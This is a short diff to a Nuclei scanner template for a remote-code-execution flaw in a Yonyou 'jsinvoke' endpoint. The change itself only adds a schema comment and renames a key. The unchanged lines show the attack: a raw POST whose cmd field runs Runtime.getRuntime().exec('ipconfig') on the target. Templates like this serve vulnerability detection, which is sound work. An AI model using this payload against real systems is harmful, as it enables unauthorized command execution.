@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: youyong-jsinvoke-upload
 
 info:
@@ -7,7 +8,7 @@ info:
   tags: youyong,rce
 
 
-requests:
+http:
   - raw:
       - |
         POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
@@ -44,7 +45,7 @@ requests:
 
         cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
 
-        
+
     matchers-condition: and
     matchers:
       - type: word
